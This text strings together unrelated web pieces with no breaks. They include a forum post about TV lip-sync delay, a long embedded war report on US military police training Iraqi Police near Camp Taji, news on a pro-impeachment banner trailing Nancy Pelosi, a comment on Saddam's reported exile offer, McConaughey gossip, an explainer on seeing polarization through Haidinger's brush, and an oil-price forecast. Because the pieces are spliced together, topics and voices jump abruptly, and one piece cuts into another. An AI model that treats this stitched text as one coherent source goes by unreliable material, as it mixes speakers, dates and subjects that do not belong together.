But I have never watched a TV from 100 feet away !
It has recently occurred to me that this experience might instead be due to some flaw IN MY BRAIN .
( Other than that one ! )
What if it is ONLY ME who notices this situation ?
What if everyone else sees the picture and sound exactly match up , as they clearly should ?
THAT might suggest an entirely NEW field of research to study !
IF it is true that IN ME my " optical path and processing " somehow has a 1/10 second delay over my " aural path and processing " , I believe this would be a phenomenon that no one has ever seen before !
IF that is the case , then what if other people had different sensory paths and processing that have noticeable delays in them ?
Could something like that have anything to do with something like epilepsy ?
Or the fact that some people seem " keyed - up " while others are " low - key " ?
Please realize that this effect is pretty subtle , only around 1/10 second .
If I was not so fanatical about strict observational skills regarding scientific events , I probably would never even have noticed this very minor effect .
If the screen is not a full - face talking head , it seems impossible to notice at all .
And it is most obvious when the talking head makes a sudden sound , where it is weird to HEAR the sound BEFORE the image of the mouth moves !
At the moment , I really do not know whether that experience I have noticed for at least 20 years is just something inside me , or whether it is some designed aspect of television broadcasting .
So I guess I am interested to learn if others might " very carefully watch TV " to see if they do or do not notice the same thing I have described here .
EITHER would be wonderful for me to learn !
WELL , now I know this one !
It turns out that it IS a result of the way that TV signal transmission occurs !
Some very new and very advanced TVs have a capability of correcting for this problem !
It is called an Audio Sync problem !
Some new TVs call their correcting software Lip Sync .
I still cannot find any information on just how many milliseconds this problem is , so I am still interested in that .
But it IS nice to know that I am not entirely crazy !
The new TV Lip Sync software has an ADJUSTMENT where I can set the TV for any amount of time delay in the audio , so a TV owner can CORRECT for this effect , to see lips moving at the correct time as the words are heard !

The Future of Iraq
by Michael J. Totten
MUSHADAH , IRAQ – “ Al Qaeda terrifies locals , ” said Major Mike Garcia from Canyon , Texas , before he put me in a convoy of Humvees with 18 American Military Police on their way to the small town of Mushadah just north of Baghdad .
“ The only people Iraqis may be more afraid of is their mothers .
When we arrest or detain people and threaten to call up their mom , they completely freak out .
Please , no , do n’t tell my mother they say .
Women are quiet outside the house , but they severely smack down their bad kids inside the house .
When your Iraqi mother tells you to knock something off , you knock it off . ”
The American military has slowly figured out how to leverage Iraq ’s culture to its advantage , but it only works to an extent .
Locating , killing , capturing , and interrogating terrorists and insurgents is the easy part .
The hard part is training Iraqis to do it themselves .
Our destination in Mushadah was the local police station where American Military Police train and equip Iraqi Police , and where it ’s still too dangerous for either Iraqis or Americans to walk the streets .
“ I am not trying to scare you , ” said Captain Maryanne Naro , from Fort Drum , New York .
“ But do n’t get out of your vehicle unless something catastrophic has happened to it . ”
I walked the streets of Baghdad every day with soldiers from the 82nd Airborne Division , but that clearly was n’t going to happen in Mushadah .
“ It ’s pretty bad up there , ” she added .
“ AQI [ Al Qaeda in Iraq ] is all over the area because they ’ve been pushed out of Baghdad , Ramadi , and Fallujah . ”
Just driving to Mushadah from the base at Camp Taji was dangerous in a weird sort of way .
“ Our convoys are hit with IEDs every day on the road , ” she said .
I swallowed hard .
“ Should I really be going up there ? ” I said .
“ Oh , do n’t worry , ” she said .
“ It ’s fine . ”
I laughed .
It ’s fine ?
How is that fine ?
Nothing , except perhaps kidnappers , is scarier in Iraq than IEDs , especially now that Iranian - manufactured armor- piercing EFPs – Explosively Formed Penetrators – are deployed by Shia militias .
“ None of us have been hurt , ” she said .
“ They ’re just small harassment attacks .
Most of the IEDs are mortar rounds , and the Humvees are armored .
They usually just pop tires and blow off our mirrors .
They do it to piss us off . ”
“ The route clearance team is out there right now , ” said mission leader Sergeant James Babcock , from Adams , New York , as he showed me which of the five Humvees I was to ride in .
Mine was in the middle of the convoy .
The Humvee behind mine was recently hit with an IED .
“ That shrapnel ca n’t go through the armor , ” Sergeant Babcock said when he saw me taking a photograph of the damage .
“ The doors are armored and the windows are bulletproof .
All that shrapnel did was tear holes in the trunk and rip through cases of Gatorade .
It was kind of annoying . ”
“ No one fires off EFPs in the area ? ” I said , referring to the unstoppable molten copper penetrators .
“ Nah , ” he said .
“ It ’s just Al Qaeda here . ” Sunni insurgents and terrorists do n't have access to the Iranian - made weapons .
“ There ’s a lot of harassment , ” Captain Naro said , “ and not a lot of competence . ”
We saddled up and left Camp Taji to the north .
Everyone locked and loaded their weapons on the way out the gate .
“ Hopefully we wo n’t have any fireworks for you today , ” my driver said .
Well , I thought , it certainly would be interesting if there are some fireworks for me today .
Not every Humvee in Iraq is up - armored , and not every IED - laced road in Iraq is free of those terrifying EFPs .
And so , I figured , if I ’m ever going to be hit with an IED , let it be today .
It was a strange feeling , a bit like being in a shark cage – inches away from mortal peril , but kinda sorta okay … as long as an IED did n't explode under the vehicle .
“ AQI always puts the IEDs in the same places on this road , in culverts and holes they already dug , ” Captain Naro said .
“ We just swerve around them . ”
“ Are they stupid ? ” I said .
She gave me a look , as if the question was a little too cocky , that it was dangerous to dismiss Al Qaeda as stupid .
I agree , of course , in general , but I ca n’t help but think putting IEDs in the same places over and over again is n’t too bright .
Getting into a Humvee with the Army in a war zone all by itself can be a little bit stressful .
The ranking officer inside often reminds everyone else of the safety procedures – which are not at all like the safety procedures you ’ll hear from a stewardess on United Airlines just before take off .
“ Combat lock ! ” he might yell , which means everyone must lock their door so no one can open it from the outside and shoot people inside .
“ Everybody remember what to do if someone throws a grenade in the truck ? ”
No , I did not remember .
It is not something anyone ever taught me .
“ Yell grenade grenade grenade and get the hell out as quickly as possible .
If you do n’t have time to get out , turn your back to the blast and hope for the best . ”
The drive from Camp Taji to Mushadah only took 20 minutes , and our Humvee drivers swerved suddenly and dramatically 8 or 9 times to avoid possible IEDs .
They also drove the Humvees about as fast as they could .
The assumption was that the IEDs on this road were manually detonated by a trigger man .
There are many places to hide .
Fast moving targets are harder to hit .
And because the IEDs do n’t explode on their own , the odds of any Humvee in particular being hit were no greater or less than the odds of any other Humvee being hit .
Riding in the front of the convoy was no more dangerous than riding anywhere else .
And riding in the middle or in the rear was n’t safer .
Of course that did n’t stop me from trying to convince myself that I rode in the lucky Humvee that would n’t be hit for some reason .
Everyone does it .
There were n’t any fireworks that day , at least not against my convoy .
But we still were n’t quite safe once we reached the police station .
“ Get inside , ” Sergeant Anthnoy Doucet , from Lake Charles , Louisiana , said to me when we stepped out of the Humvees .
“ This place is a mortar magnet . ”

Every place in Iraq is hot during the summer , but the Mushadah police station was merciless .
Only two rooms had air conditioning .
The rest were miserable sweat boxes .
Captain Maryanne Naro was supposed to join us , but she had to remain at Camp Taji .
That was too bad .
I was hoping to see how the Iraqi Police interacted in person with an American woman who outranked almost all of them .
“ The police wo n’t leave the station , ” Major Garcia said , “ unless Americans are there to protect them .
They would n’t leave under any circumstances until Captain Naro showed up and was willing to go out on patrol .
They were ashamed that a woman had more guts than they did . ”
“ They will go out alone now for something real basic , ” she said .
“ Otherwise if Americans are n’t with them they ’ll hide in the station .
They ’re hard to work with at times , like they ’re kids . ”
Incompetence , though , is the least of their problems .
“ About half of them are corrupted , ” she said , “ and it ’s hard to get the bad ones out .
Some of the higher ups are corrupted too , but it ’s hard to prove .
They help AQI , they set up illegal checkpoints , and they raid civilian houses so they can steal stuff . ”
Not surprisingly then , local civilians are just as afraid of the police as the uncorrupted police are afraid of the neighborhood .
“ Locals come in here all the time and talk to Americans , ” she told me .
“ They ’re afraid to give intel to the Iraqi Police . ”
Mushadah is a bad area with bad police and a bad police station .
The building itself is filthy and ramshackle .
The stairs to the second floor are murderously uneven , not because they ’ve been damaged but because they were built by incompetents .
I ’ve seen dodgy construction in Iraq – even at Saddam ’s palaces , believe it or not – but this station was the worst .
I ’ll spare you a description of the bathroom .
There was a protective wall in front of the station , but it had recently been destroyed by a mortar round .
Another wall on the south side of the building was blown over during a spring wind storm .
The whole place was almost destroyed not long ago .
An Al Qaeda suicide bomber filled a dump truck with explosives and tried to ram it into the building , but he drove too fast around a corner and the whole thing tipped over .
Everyone would have been killed had he succeeded .
Sergeant Doucet led me to the front door from the inside so I could photograph some of the Iraqi Police standing at attention .
“ How many of these guys do you suppose are Al Qaeda infiltrators ? ” I said .
I just could n’t look at them without wondering .
“ I do n’t know , ” he said .
“ We speculate about it .
We do n’t investigate them or anything like that . ”
“ You do n’t ? ” I said .
“ Why not ? ”
“ We are n’t passive about it , ” he said .
“ If we suspect someone has gone over the edge , he ’ll raise a red flag and we ’ll deal with it . ”
“ How much support do you get from local civilians ? ” I said .
“ Locals bring in tips against bad guys all the time , ” he said .
“ Several times a week .
What they tell us is not very tangible though .
Sometimes it ’s useless .
Someone will come in here and scream
There ’s bad guys out there !
We ’ll ask where .
To the west !
they ’ll say .
Well , no crap . ”
Sergeant Doucet
“ Residents are still afraid to give intel on bad guys , ” he continued .
“ Insurgents will kill them if they do .
The area is totally unsecured .
Even if we question people who live right in front of an IED trigger point they wo n’t say anything .
But , look , forget what you see on the news .
People in this community are just like people in any other community .
This guy is pissed off at that guy , and you have to deal with it . ”
I ’ve been in parts of Iraq where local civilians cooperate with the army and police and where they do not .
Civilians cooperate as much as security on the streets will permit them .
The dynamic here is n’t all that hard to understand , or even that foreign .
If you want to see how this has played out in America , watch Elia Kazan ’s
On the Waterfront , the classic film from 1954 starring Marlon Brando about the mafia ’s infiltration of a longshoreman ’s union .
No one in that story wanted to cooperate with the police in their murder investigations against the mob because they were terrified of being “ next ” if they did .
“ We have a medical facility here , ” Sergeant Doucet said .
“ Local civilians can come here and use it , and they do . ”
They did while I was there .
A three year old boy was badly burned at his house – how , I do n’t know – and he was brought in to be treated by a medic .
I let the medic tend to the boy and stepped into the Tactical Operations Center , one of only two rooms in the station that had air conditioning .
“ Hello again , sir , ” Sergeant Babcock said and pulled up a chair for me .
He then gave me more background and asked me not to take pictures of anything in that room .
“ Lots of Iraqi Police here had orders to work in Baghdad , ” he said , “ but they refused .
They are Sunnis .
This is a Sunni area .
Baghdad , as you know , is mostly Shia .
Their names and license plates mark them for death .
They work here but are counted as AWOL and are not being paid . ”
Some of the Iraqi police are honorable men .
( And they are all men . )
I do n’t want to leave you with the impression that all of them are terrorist infiltrators .
They are n’t .
“ Because of logistics problems we have to go to Baghdad for fuel , ” Sergeant Babcock said , “ and we have to go to a Shia area .
It ’s very dangerous for them and they ask us to go with them .
They have problems getting ammo as well .
There are always problems with ammo . ”
And there are severe problems with other stations .
“ The Taramiyah station was hit by insurgents earlier this spring , ” he said .
“ It was completely destroyed .
Only six officers from that station are brave enough to come to work here . ”
He introduced me to the man in charge of the station , Captain J. Dow Covey from New York City .
“ Do you know the Weekly Standard magazine ? ” Captain Covey asked me .
“ Of course , ” I said .
“ My buddy Tom Cotton was just written up there , ” he said .
“ It was pretty cool seeing him in that magazine . ”
“ What did he do to get in the magazine ? ” I said .
“ He ’s like me , ” he said .
“ He ’s a Harvard Law grad who joined the Army after 9/11 .
I ’m an attorney . ”
“ You ’re an attorney ? ” I said .
“ What are you doing out here in Iraq ? ”
“ I practiced law for three years , ” he said , “ then got into investment banking .
When 9/11 happened I just had to sign up with the Army .
Investment banking is a lot more stressful than this . ”
“ You ’re kidding , right ? ” I said .
“ No , ” he said and laughed .
“ I am totally serious . ”
If he was deployed in , say , Kurdistan I could see it .
But Mushadah was stressful .
Less stressful than investment banking ?
Investment banking in New York must really be something .

Not much happened the first half of my day at the station , so I lounged with the MPs in their broiling quarters .
None of them had anything positive to say about the Iraqi Police they were training .
“ What can you really ask for in a lazy society ?
You go in their houses and the floors and covered in pillows . ”
“ You can tell who is corrupt because their convoys never get hit . ”
“ This place would n’t be so bad if it was n’t so fucking hot .
I can deal with being shot at and blown up , but 150 degrees is a bit much . ”
“ Some Iraqi Police recently left the station , we got hit with a bunch of mortars , then they came right back inside .
This sort of thing happens a lot .
It makes us suspicious . ”
“ We ’re giving them 50,000 dollar Chevy trucks and it ’s like a junkyard out back .
It ’s like Sanford and Son out there .
They drive stuff better than we can afford , and they do n’t even take care of it . ”
“ I miss Baghdad .
One day we’d be walking out on the street buying sandwiches and playing soccer with kids .
The next day we ’d get in a firefight with burning tires and RPGs and shit .
The next day we ’d be hanging out and chilling like normal again .
It ’s a weird place , and really keeps you on your toes . ”
“ It ’s not like Germany or Japan where people wanted a change .
The Kurds up north wanted a change , so they got one .
The Arabs do n’t , so they are n’t .
They hardly change even with us here . ”
The Iraqi Army in the area is n’t faring much better .
“ They are severely infiltrated by Al Qaeda and the Mahdi Army , ” Colonel John Steele , from Dover , New Hampshire , told me back at Camp Taji .
The Iraqi Army soldiers who are n’t double agents are still nowhere near ready to defend their own country .
“ We assess , train , and help provide logistical support to prevent catastrophic failure , ” he said .
“ Their logistics are very immature .
They are always short on ammo .
And we have to hold their hands and make sure they do n’t kill themselves and others .
We still do some unilateral U.S. actions even though we want to become partnered with the Iraqi Army in all our operations .
But we first want to make sure they have all the skills they need to survive in combat . ”
Most American soldiers I spoke to about the Iraqi Army and Iraqi Police , not just in Mushadah but also in Baghdad , have a dim view of their local counterparts .
( The situation is strikingly different in Anbar Province , and I ’ll get to that in future articles . )
I wanted to know what the colonel thought .
“ Do you trust them ? ” I said .
He paused for a long time and answered very carefully .
“ We wo n’t tell them about sensitive operations until the last second , ” he said .
“ I trust some individuals , though , because I know them .
I ’d share a foxhole with them as far as ideology goes , but I ’m not sure how good their skills are when they are shot . ”
Pride is much more important in Arab culture than it is in the West .
Humiliation is therefore more painful .
I wondered if this created problems when Americans train Iraqi soldiers and police officers .
What must it feel like for local men to be yelled at by foreigners who showed up uninvited and knew their job better than they did ?
Colonel Steele insists it is n’t a problem .
“ They do n’t want to be babied , ” he said .
“ They want to be treated as equals and adults .
Their shame culture actually helps .
Our new recruits recently complained about having sore feet during a march .
When they noticed our female soldiers are in better shape than they are , they never complained again .
Also , when we first had them try on our body armor , it nearly broke their spines .
They want to be physically capable of wearing it , too . ”
It ’s at least possible that some of the infiltrators may be turned over time .
Some former insurgents elsewhere in Iraq are now openly siding with the Americans .
There also is this : “ We give them rudimentary skills and a work ethic , ” he told me .
“ They attend the same classes on character and honor and professional conduct becoming a soldier that our own people attend . ”
Is he optimistic ?
“ I am optimistic , ” he said .
“ But only for one single reason .
Because I talk to the average Joe in Iraq .
I meet the children and parents .
Iraqi parents love their children as much as I love mine . ”
I knew what he meant .
Counterintuitive and contradictory as it may seem , I never felt more optimistic in Iraq than I did when I walked the streets and interacted with average Iraqis .
Iraq looks more doomed from inside the base than it does outside on the street , and it looks more doomed from across the Atlantic than it does from inside the base .
Major Mike Garcia said this view of Iraq is typical .
“ Soldiers who do n’t leave the FOB [ Forward Operating Base ] are more likely to be pessimistic than those who go out on patrol .
They ’re less aware of what ’s actually happening and have fewer reality checks on their gloom . ”

Sergeant Babcock invited me to a meeting with Iraqi Police Colonel Hameed , the man who was responsible for the station on the Iraqi side .
Sergeant Babcock , Sergeant Doucet , an interpreter , the colonel , and I sat together in the only other room at the station that had air conditioning .
“ You are most welcome , ” the colonel said to me in a noticeably insincere tone of voice .
Some of the MPs think he ’s corrupt .
I do n’t know if that means they think he works with Al Qaeda .
“ Thank you , ” I said .
“ May I take your picture ? ”
“ No , ” he said , “ please do n’t . ”
It did n’t sound like he actually cared though , as if he was just going through the motions of needing protection from terrorists .
He and the American MPs discussed fuel logistics .
“ The only reason the Iraqi Police got fuel on the last mission , ” he said , “ is because you were with us .
Otherwise they would n’t have given us anything . ”
Suddenly Captain Covey , the New York City attorney , nearly broke down the door as he barged into the room .
“ Hey ! ” he screamed at the colonel .
“ I ’m tired of you motherfuckers stealing our fuel cans .
I ’m going to kick all you motherfuckers out of here .
I ’m sorry for interrupting your little meeting , but at noon I want every single one of you people off this post . ”
He stared at the interpreter .
“ Translate that ! ” he said .
He slammed the door behind him .
Everyone just looked at each other .
A quietly horrified expression washed over the face of the colonel when he saw me taking notes .
The meeting was over , obviously .
I stepped into the hallway and asked the nearest MP what was going on .
“ 61 fuel cans have been stolen over the last week by Iraqi police officers here , ” he said .
“ Three more were stolen today .
These are fuel cans that Iraqis and Americans risk their lives to go get . ”
The tension in the hallway was palpable .
None of the Iraqi Police could look me in the eye .
“ Can the captain really kick the Iraqis out of here ? ” I asked Sergeant Babcock .
“ Actually , he can , ” he said .
He sounded mortified at the idea .
Colonel Hameed walked up to Sergeant Babcock .
He was furious .
“ Your captain offended us by coming in here and yelling like that , ” he said .
“ I need you to find a solution . ”
“ I ’m a staff sergeant , ” Sergeant Babcock said .
“ He ’s a captain .
I ’m also an MP and he ’s Infantry .
I have to obey him whether I like it or not . ”
“ This station does not belong to his family , ” the colonel said curtly .
“ This is unacceptable .
The building is ours , and he is our guest .
A guest cannot fire the owner of the house . ”
“ We ’ll go talk to him and come back , ” Sergeant Babcock said .
As it turned out , the whole thing was a screw up .
Somebody forgot to update the board and account for three fuel cans that were taken legitimately .
Captain Covey was embarrassed .
“ Would you really have kicked them all out of here ? ” I said .
“ In the state of mind I was in then , yes , ” he said .
“ I was ready to do it .
But I calmed down and would have gotten in trouble anyway .
So no , I would n’t have actually done it . ”
61 fuel cans really had been stolen that week , however .
The Iraqi Police were in serious trouble .
Another Iraqi Police colonel , whose name I did not catch and whom no one thinks is corrupt , arrived on the scene and screamed himself hoarse at his deputies .
“ Coalition Forces are screaming at us ! ” he hollered .
“ Screaming at us because you keep stealing fuel ! ”
He kicked an empty metal garbage can and clangingly knocked it over .
The Iraqi Police glowered at him as if they wanted to scream back and were trying mightily to restrain themselves .
An American MP walked past me .
“ That ’s the first time I ’ve seen those guys yelled at , ” he said and grinned with satisfaction .
*
Shortly after noon an International Police Advisor from Michigan named Paul taught an hour - long class to the Iraqi Police officers about taking weapons from potentially dangerous people who are under arrest .
The officers seemed to learn as much sitting through that course as I did .
Apparently they had never gone over the procedures before .
I could n’t help wondering as I watched the Iraqis … which of you work for Al Qaeda ?
Maybe no one in the photo works for Al Qaeda .
I do n’t have a sense of how many infiltrators there actually are , although Captain Naro thinks the number could be as high as 50 percent .
Is it really a good idea to train these men with that in mind ?
“ Please do n’t publish my picture , ” Paul said to me after the class .
“ And use only my first name .
Only my wife knows I ’m in Iraq . ”
I wanted to know what he thought of the trainees .
He has trained police officers all over the world , not just in Iraq and the United States .
He could , perhaps , see them through more worldly eyes than the American MPs who had a narrower range of experience .
“ They ’ve made leaps and bounds in the past two months , ” he said .
“ Every day they make progress .
Today they made progress . ”
“ Are you optimistic about them ? ” I said .
“ Oh , absolutely , ” he said .
“ The Iraqi Police are like sponges .
It ’s all new to them . ”
“ Lots of American soldiers I ’ve talked to about the Iraqi Army and Iraqi Police do n’t think very highly of them , ” I said .
“ Look , ” he said .
“ The other contractors I know who train the police are also optimistic .
Many file extensions to stay longer because they feel like they ’re making a difference .
I never hear anything negative from any of them .
We watch the Iraqis progress over time because we work with them daily .
Most American soldiers do n’t see the progress because they observe the Iraqis from more of a distance .
You yourself are only seeing a snapshot in time .
If you think it looks bad now , you should have been here two months ago . ”
It was time to head back to Camp Taji .
The MPs and I saddled up in our Humvees while , in front of us , Iraqi Police piled into their trucks .
We would escort them out of the station , then they would be on their own .
They were going out alone , apparently for something “ real basic , ” as Captain Naro had told me .
The Iraqi Police truck in front of my Humvee had an office chair crazily bolted into the flatbed .
A policeman strapped himself into that and manned a mounted machine gun . .
“ Is he really going out all exposed like that ? ” I said .
“ He is , ” Sergeant Babcock said .
“ I ca n’t quite decide if that ’s pathetic or if it ’s a testament to the human spirit .
Maybe it ’s a little of both . ”
We drove back down IED Alley to Camp Taji .
It was 4:00 in the afternoon , and so unbearably hot .
The air conditioner in the Humvee hardly did anything .
I desperately wanted a shower so I could wash Iraq off my skin .
Nothing exploded on our way back .
Major Garcia wanted to know what I thought .
I did n’t know what to say .
“ Whether we like it or not , ” he said , “ and whether we like them or not , they are the future of this country . ”

Impeachment appeal to trail Pelosi in New Orleans Tuesday Nick Juliano
Published : Tuesday August 14 , 2007
Print This Email This House Speaker Nancy Pelosi has so far refused calls from some congressional Democrats to begin impeachment proceedings against President Bush and Vice President Dick Cheney .
While Pelosi tours New Orleans Tuesday morning , a group of pro-impeachment activists is planning on trailing the top House Democrat with a flying banner urging her to reconsider impeachment .
" PELOSI IMPEACH BUSH ! text IMPEACH to 30644 , " the banner to be towed by an airplane over the hurricane - ravaged city 's Lower Ninth Ward will read .
Democrats.com and AfterDowningStreet.org , two liberal websites that also act as sort of online clearinghouses of impeachment information , are sponsoring the banner .
The same groups were behind an effort last month to fly a pro-impeachment banner over baseball 's All Star Game in San Francisco , Pelosi 's hometown .
" Bush was warned about Katrina and claimed he was not .
In the months since , he has failed to serve the people of New Orleans and the Gulf Coast , " David Swanson , the co-founder of AfterDowningStreet.org , said in a statement released to RAW STORY .
" This abuse of power falls under the heading of the old British phrase ' high crimes and misdemeanors . '
That we have not yet impeached Bush for the same charges brought against Nixon , including the now routine refusal to comply with subpoenas , is troubling .
That we have not yet impeached him for what he has done to New Orleans and the Gulf Coast is a deep moral disgrace . "
Pelosi is one of 14 members of the House visiting New Orleans this week to assess recovery efforts as the city prepares to mark the two - year anniversary of Hurricane Katrina .
Tuesday is the last of a three - day tour of the city .
The Congressional delegation is expected to tour several health clinics in the Lower Ninth Ward from 9 a.m. until noon Tuesday ; the pro-impeachment banner will be circling overhead then .
A resolution introduced in April calling for Cheney 's impeachment has gained 16 co-sponsors in the House so far .
Ohio Rep. Dennis Kucinich , who also is seeking the Democratic presidential nomination , introduced the resolution .
Pelosi and Rep. John Conyers , chairman of the House Judiciary Committee that would begin impeachment proceedings , so far have refused to consider calls for Bush and Cheney 's ouster from the White House .
Late last month more than a dozen activists , led by Cindy Sheehan , were arrested outside Conyers 's office after the Michigan Democrat refused to begin deliberations on impeachment .
Sheehan announced she would challenge Pelosi in next year 's election because of the Speaker 's refusal to work toward Bush 's impeachment .

How much money does Bush think a US soldier 's life is worth ?
How much money does Bush think the lives of our allies ' soldiers or innocent Iraqis are worth ?
As we 're finding out , not very much .
On March 17 , 2003 President Bush issued the warning : " Saddam Hussein and his sons must leave Iraq within 48 hours .
Their refusal to do so will result in military conflict commenced at a time of our choosing , " yet now thanks to a transcript leaked to the Spanish newspaper El Pais , we learn that more than three weeks prior to that Bush had told former Spanish Prime Minister Jose Maria Aznar that " The Egyptians are speaking to Saddam Hussein .
It seems he 's indicated he would be prepared to go into exile if he 's allowed to take $ 1 billion ... "
When confronted about the leaked transcript yesterday , Whitehouse spokeswoman Dana Perino did not dispute its accuracy .
Matthew McConaughey celebrated his independence from former girlfriend Penelope Cruz with a three - day bender in Costa Rica over the Fourth of July weekend .
Taking a cue from the movie that launched his career , the " Sexiest Man Alive " left much to be desired partying on the beach looking ' dazed and confused . '
A barefoot , shirtless , and sweaty Matthew got his groove on by drinking , dancing , writhing on the floor and even shushing one of his fellow vacationers .
Haidinger 's Brush
How to see polarization with the naked eye !!!
" I can see it particularly clearly in the twilight when I stare at the zenith ; the whole sky seems to be covered by a network , as it were , and everywhere I look I see this characteristic pattern .
It is very pleasing to be able to determine the direction of polarization without an instrument in this way , an even obtain an estimate of its degree " Minnaert , Light and Color in the Outdoors
The eyes of men ( AND women ) are not designed to distinguish between different types of polarization , contrary to insects , cephalopods , many amphibians , fish , and other animals , for which nature possesses a different class of " colors " ( but even common colors do not mean the same to everyone ) .
However , a small quirk in the structure of the human eye gives us ( by accident ) the ability to tell apart different states of polarization .
Thanks to this small aberration or " defect " of the eye we are not completely polarization - blind .
Yes !!!
With some effort you can learn to see what remains invisible to most people !
Without the help of any instrument you will be able to tell not only if the light you look at is strongly polarized or not , but also if it is linearly polarized or circularly polarized and , moreover , in which direction it vibrates or rotates .
Any time that you raise your eyes to the blue sky you will be rewarded by the same clues that guide bees in their flight .
Acquire P - Ray Vision !
Discovery
Wilhelm K. von Haidinger 's ( 1795 - 1871 ) , an Austrian mineralogist and geologist , long time director of the Imperial Institute of Vienna , made several important contributions to the science of optics , including an interferometer that produces fringes in thick plates and the first report of dichroism for circular polarization ( in amethysts ) .
In 1846 Haidinger was studying minerals under polarized light , carefully trying to discern any special pattern in the refracted light .
He then perceived a faint yellowish stain or brush that remained when he looked directly at the light without interposing the crystal .
The brush rotated together with the polarizer proving that he was " seeing " the polarization state .
That stain is now known as the Haidinger 's brush , and he can be credited with the unique discovery of an extra " sense " .
However , more that a century and a half later , this phenomenon remains little known ( even by scientists working in optics ! ) .
In 1954 , William Shurcliff ( then employed by Polaroid ) pointed out that the Haidinger 's brush can also detect circular polarized light and distinguish the sense of rotation .
The Brush
Observers generally describe the Haidinger 's brush as a diffuse elongated yellowish pattern , pinched at the center .
Bluish leaves , generally shorter , cross it at 90 degrees .
This pattern is created by the eye and therefore cannot be photographed and it actually changes somewhat between observers .
Some people see the yellow continuous until color fatigue makes the blue continuous , while others claim that the continuous color is whichever is perpendicular to the line joining the eyes .
Some only see the yellow part ( but I generally notice the blue first ) .
The pattern is considerably more diffuse and fainter than shown in the drawings and requires some practice to recognize it .
Some people see it more clearly , others with more difficulty , and some may not be able to see it at all .
The yellow branches point in a direction perpendicular to the vibration plane for linearly polarized light .
Thus , horizontal polarization causes a vertical ( with respect to the ground ) yellow brush irrespective of the inclination of the head .
On the other hand , circularly polarized light generates a yellow brush slanted with respect to the line bisecting the face , even if the head leans sideways .
For right - handed circularly polarized light it will go up to the right and down to the left , while the contrary will happen for left - handed light .
This is true for both the right and left eye : no bilateral symmetry here ( although there is some change between the eyes in the exact angle the brushes make , which depends on the individual ) .
The way of distinguishing between circular polarized light and slanted linearly polarized light is , of course , to lean the head sidewise and note if the brush is fixed with respect to the source of light or to the eyes .
The Haidinger 's brush is relatively small , occupying 3 to 5 degrees ( about the size of the above drawings at arm length on a standard monitor ) .
Interestingly , it should be affected by the same illusion as the moon and the sun close to the horizon , where it will be perceived as being about two times as big ( the size perception changes with the distance of the background where it is unconsciously projected ) .
The effect is weak and to perceive it the light should have a good degree of polarization ( at least of 60 % ) .
Because it is faint the background should be uniform with no distracting patterns .
In addition , the effect only happens towards the blue side of the spectrum and is missing altogether in the red ( interestingly , bees only detect polarization in the ultraviolet , although they can also see the green and blue colors ) .
It just happens that the skylight at 90 degrees from the sun is highly polarized , uniform , and blue , making it an ideal place to see the Haidinger 's brush in Nature .
How to Practice
The easiest way to see the Haidinger 's brush is to practice with fully polarized light .
For example , look through a sheet polarizer at a piece of white paper illuminated by the sun ( but avoid any direct gloss from the paper ) .
Instead of the paper you can also look at a white cloud .
My personal recipe is to look for , say , 20 seconds and then rotate the polarizer 90 degrees .
Look again for 20 seconds and then continue rotating back and forth every 5 seconds .
If you think you perceive something , rotate faster and check if the pattern switches 90 degrees each time .
Rotating the filter has two beneficial effects .
First , a changing pattern is easier to distinguish against the static uniform background .
Second , color fatigue should help perceive the complementary color when the patterns are swapped .
Looking through a green or blue filter will help .
Minnaert gives the following advice : " . . . after you observe for a minute or two , a kind of marble effect will begin to appear .
This is followed by the Haidinger 's brush . . .
It disappears in a few seconds , but if you fix your eyes on a point close to it . . . , you will see it again . . .
The task consists in learning to pick out this faint contrast . . .
Practice a few times daily for a few minutes at a time .
After a day or two , you will be able to distinguish Haidinger 's brush fairly easily when you look at the blue sky . . . "
The Haidinger 's brush for circularly polarized light is identical to the one for linearly polarized light but most reports I have seen claim that it is considerably more difficult to see .
However , in his original report Shurcliff stated : " . . . the brushes appear as prominent by circularly polarized light as by linearly polarized light . "
I think the difficulty people find when first trying the experiment with polarizers is that rotating the head or the circular polarizer does n't change the pattern on the retina , as it does in the former case .
You can solve this by using two circular polarizers of opposite handedness and switching between them .
Alternatively , if only one polarizer handedness is available , you can replace the second one by a linear polarizer oriented to produce the opposite brush and thus enhance the contrast of the first brush .
Observing the brush in the sky
The sky is the best place to look for the Haidinger 's brush in Nature .
Trained observers can see it over a good part of the sky .
The yellow branches point , in most cases , to the sun .
Some observers are able to see the change in sky polarization that occurs close to the sun , where the yellow branches can be tangential to the sun instead of radial ( see Brewster 's point ) , in spite of the lower degree of polarization and background brightness ( the sun should be blocked , of course ) .
Yet , for most people , just detecting the brush at about 90 degrees from the sun should be quite rewarding .
The best time to look is during twilight .
A short explanation
In 1866 H. von Helmoltz related the effect to dichroism of a pigment of the retina and this early explanation has proven well founded , although the exact mechanism is complicated and a full explanation is still lacking .
Although the brush is centered on the center of the visual field , its size is much larger than the fovea ( the region of the retina where we see images with higher resolution ) and thus must originate in the surrounding macular area of the retina .
The fact that it has color means that the cones ( and not the rods ) are involved .
The brush is invisible in the red , a region where the macula pigment is transparent .
The main suspect is the pigment Lutein , which is a long chain molecule that absorbs more for light polarized with the electric vector parallel to the molecular axis than for the perpendicular polarization .
That Lutein is dichroic is not enough ; the molecules should be aligned for the effect not to average out .
A partial alignment of the molecules as concentric circles around the fovea will do , as shown in the following drawing :
If , for example , light is polarized vertically , sector A will have the pigment molecules on average perpendicular to the light vibration , absorbing little light .
The reverse is true for sector B .
Thus a four leaf pattern similar to the Haidinger brush would be produced .
In the example , sector A would be blue and sector B yellow .
The macular pigment is located between the outer and inner limiting membranes of the retina , a region containing radially arranged nerve fibers , which would explain the partial alignment of the molecules .
The percentage of molecules aligned is small , explaining the weakness of the effect .
This explanation is not complete as a detailed simulation does not exactly reproduce the Haidenger 's brush .
The outer layer of the cones is birefringent , which undoubtedly contributes to the effect and more studies are needed .
Interestingly , the cornea has also a slight birefringence , with the slow axes generally slanted 20 to 30 degrees down towards the nose .
This would create two preferential directions for detection of linear polarization .
Analysts at Goldman and CIBC say $ 100 oil may be just months away .
The $ 100 - a - barrel oil that Goldman Sachs Group Inc. said would prevail by 2009 may be only a few months away .
Jeffrey Currie , a London - based commodity analyst at the world 's biggest securities firm , says $ 95 crude is likely this year unless OPEC unexpectedly increases production , and declining inventories are raising the chances for $ 100 oil .
Jeff Rubin at CIBC World Markets predicts $ 100 a barrel as soon as next year .
Higher prices will increase revenue for energy producers from Exxon Mobil Corp. to PetroChina Co. , while eroding profit at airlines including EasyJet Plc and railroads such as Union Pacific Corp .
